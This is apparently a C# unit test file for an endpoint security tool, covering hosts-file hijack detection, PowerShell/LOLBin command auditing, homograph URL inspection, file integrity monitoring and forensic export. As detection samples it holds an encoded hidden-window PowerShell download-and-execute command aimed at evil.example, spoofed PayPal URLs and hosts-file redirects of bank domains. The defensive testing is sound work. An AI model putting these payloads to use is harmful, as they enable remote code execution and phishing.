using System.IO.Compression;
using System.Text;
using Becetti.Security.Core.Models;
using Becetti.Security.Core.Services;
using Xunit;

namespace Becetti.Security.Core.Tests;

/// <summary>
/// Real integration & unit tests for all new EDR, Hardening, FIM, Hosts/DNS,
/// Camera/Mic, Script/LOLBins, URL Homograph Inspector, and Forensic Evidence ZIP features.
/// </summary>
public sealed class EdrAndHardeningFeaturesTests : IDisposable
{
    private readonly string _tempDir;

    public EdrAndHardeningFeaturesTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), "BecettiEdrTests_" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try { if (Directory.Exists(_tempDir)) Directory.Delete(_tempDir, recursive: true); } catch { }
    }

    [Fact]
    public async Task HostsDnsGuard_DetectsSuspiciousHijackAndRealTimeTampering()
    {
        var fakeHosts = Path.Combine(_tempDir, "hosts");
        await File.WriteAllTextAsync(fakeHosts,
            "# Normal comment\n" +
            "127.0.0.1 localhost\n" +
            "127.0.0.1 windowsupdate.microsoft.com\n" +
            "185.199.110.153 paypal.com\n");

        using var guard = new HostsDnsGuardService(fakeHosts);
        var audit = await guard.AuditAsync();

        Assert.True(audit.Success);
        Assert.NotNull(audit.Value);
        Assert.True(audit.Value!.HostsFileExists);
        Assert.Equal(3, audit.Value.TotalMappings);
        Assert.Equal(2, audit.Value.SuspiciousMappings);
        Assert.False(string.IsNullOrWhiteSpace(audit.Value.HostsSha256));

        // Real-time FileSystemWatcher tamper alert test
        var tcs = new TaskCompletionSource<HostsTamperAlert>(TaskCreationOptions.RunContinuationsAsynchronously);
        guard.HostsTampered += (_, alert) => tcs.TrySetResult(alert);
        var start = guard.StartWatching();
        Assert.True(start.Success);

        await File.AppendAllTextAsync(fakeHosts, "1.2.3.4 chase.com\n");
        var completed = await Task.WhenAny(tcs.Task, Task.Delay(TimeSpan.FromSeconds(5)));
        Assert.Same(tcs.Task, completed);

        var tamper = await tcs.Task;
        Assert.NotEqual(tamper.PreviousSha256, tamper.NewSha256);
    }

    [Fact]
    public void ScriptAuditor_DetectsLolBinsAndDecodesUtf16PowerShellBase64()
    {
        var svc = new ScriptCommandAuditorService();
        var originalPayload = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')";
        var b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(originalPayload));
        var cmd = "powershell.exe -NoP -w hidden -EncodedCommand " + b64;

        var finding = svc.AnalyzeCommandLine("UnitTest", "powershell.exe (PID 9999)", cmd);
        Assert.NotNull(finding);
        Assert.True(finding!.RiskLevel is "High" or "Critical");
        Assert.Contains("EncodedCommand", finding.MatchedIndicators);
        Assert.Contains("Hidden Window", finding.MatchedIndicators);
        Assert.Equal(originalPayload, finding.DecodedBase64);

        var benign = svc.AnalyzeCommandLine("UnitTest", "notepad.exe", "notepad.exe readme.txt");
        Assert.Null(benign);
    }

    [Fact]
    public async Task UrlPhishingInspector_DetectsHomographBrandSpoofingAndRawIp()
    {
        var svc = new UrlPhishingInspectorService();

        // Mixed Latin + Cyrillic homograph ("paypal" with Cyrillic 'а' U+0430)
        var homographUrl = "https://p\u0430ypal.com/login";
        var res1 = await svc.InspectUrlAsync(homographUrl, performLiveNetworkCheck: false);
        Assert.True(res1.Success);
        Assert.NotNull(res1.Value);
        Assert.True(res1.Value!.IsHomographSuspected);
        Assert.Contains("xn--", res1.Value.PunycodeHost);
        Assert.True(res1.Value.RiskScore >= 50);

        // Brand spoofing + raw HTTP + embedded @ userinfo
        var phishUrl = "http://microsoft.com@192.0.2.44/login-office365";
        var res2 = await svc.InspectUrlAsync(phishUrl, performLiveNetworkCheck: false);
        Assert.True(res2.Success);
        Assert.True(res2.Value!.RiskScore >= 65);
        Assert.Equal("Critical", res2.Value.RiskLevel);
    }

    [Fact]
    public async Task FileIntegrityMonitor_TracksVerifiesDetectsModificationAndRebaselines()
    {
        var storePath = Path.Combine(_tempDir, "fim.json");
        var secretFile = Path.Combine(_tempDir, "contract.txt");
        await File.WriteAllTextAsync(secretFile, "ORIGINAL-SECURE-CONTENT-2026");

        using var fim = new FileIntegrityMonitorService(settings: null, customStorePath: storePath);
        var add = await fim.TrackFileAsync(secretFile);
        Assert.True(add.Success);

        var verify1 = await fim.VerifyAllAsync();
        Assert.True(verify1.Success);
        Assert.Equal(1, verify1.Value!.IntactCount);
        Assert.Equal(0, verify1.Value.ModifiedCount);

        // Tamper with 1 byte
        await File.WriteAllTextAsync(secretFile, "TAMPERED-SECURE-CONTENT-2026");
        var verify2 = await fim.VerifyAllAsync();
        Assert.True(verify2.Success);
        Assert.Equal(0, verify2.Value!.IntactCount);
        Assert.Equal(1, verify2.Value.ModifiedCount);

        // Re-baseline and re-verify
        var re = await fim.RebaselineFileAsync(secretFile);
        Assert.True(re.Success);
        var verify3 = await fim.VerifyAllAsync();
        Assert.Equal(1, verify3.Value!.IntactCount);
        Assert.Equal(0, verify3.Value.ModifiedCount);

        // Untrack
        var rm = await fim.UntrackFileAsync(secretFile);
        Assert.True(rm.Success);
    }

    [Fact]
    public async Task WindowsHardening_Persistence_CameraMic_AndForensicZip_WorkOnRealWindows()
    {
        if (!OperatingSystem.IsWindows())
            return;

        var forensics = new FileForensicsService();
        var persistence = new PersistenceHunterService(forensics);
        var pRes = await persistence.AuditAsync();
        Assert.True(pRes.Success);
        Assert.NotNull(pRes.Value);
        Assert.True(pRes.Value!.TotalInspected > 0);

        var hardening = new WindowsHardeningService();
        var hRes = await hardening.AuditAsync();
        Assert.True(hRes.Success);
        Assert.NotNull(hRes.Value);
        Assert.True(hRes.Value!.TotalEvaluated >= 5);
        Assert.InRange(hRes.Value.ScorePercent, 0, 100);

        var camMic = new CameraMicAuditorService();
        var cRes = await camMic.AuditAsync();
        Assert.True(cRes.Success);
        Assert.NotNull(cRes.Value);

        var ks = new NetworkKillSwitchService();
        var ksRes = await ks.GetStatusAsync();
        Assert.True(ksRes.Success);
        Assert.False(ksRes.Value!.IsIsolated);

        // Export real Forensic Incident Evidence ZIP bundle
        var settings = new SettingsService(_tempDir);
        var yara = new YaraEngineService(new HttpClient(), settings);
        var net = new NetworkMonitorService();
        using var hosts = new HostsDnsGuardService();
        var quarantine = new QuarantineService(settings);
        var events = new EventLogService(_tempDir);

        var evidence = new IncidentEvidenceService(yara, net, persistence, hosts, camMic, hardening, quarantine, events);
        var bundleRes = await evidence.ExportForensicBundleAsync(_tempDir);
        Assert.True(bundleRes.Success);
        Assert.NotNull(bundleRes.Value);
        Assert.True(File.Exists(bundleRes.Value!.BundleZipPath));
        Assert.True(bundleRes.Value.SizeBytes > 500);
        Assert.Equal(64, bundleRes.Value.Sha256.Length);

        using var zip = ZipFile.OpenRead(bundleRes.Value.BundleZipPath);
        Assert.Contains(zip.Entries, e => e.Name == "SUMMARY.txt");
        Assert.Contains(zip.Entries, e => e.Name == "processes.json");
        Assert.Contains(zip.Entries, e => e.Name == "windows-hardening.json");
        Assert.Contains(zip.Entries, e => e.Name == "persistence-audit.json");
    }
}
